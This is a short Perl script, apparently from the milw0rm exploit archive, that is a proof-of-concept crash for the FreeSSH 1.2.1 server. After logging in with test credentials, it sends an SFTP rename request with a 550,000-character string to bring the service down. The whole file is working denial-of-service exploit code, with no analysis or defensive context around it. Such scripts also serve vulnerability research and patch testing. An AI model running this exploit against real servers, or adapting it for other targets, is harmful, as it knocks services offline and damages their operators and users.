#!/usr/bin/perl
# Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com]
# FreeSSH 1.2.1 Crash -- A Product of Fuzzing. Stay Tuned.
use Net::SSH2;

$host     = "192.168.0.187";
$port     = 22;
$username = "test";
$password = "test";
$dos      = "A" x 550000;

$ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port)               || die "\nError: Connection Refused!\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$sftp = $ssh2->sftp();
$rename = $sftp->rename($dos, "test");
$ssh2->disconnect();
exit;

# milw0rm.com [2008-10-22]
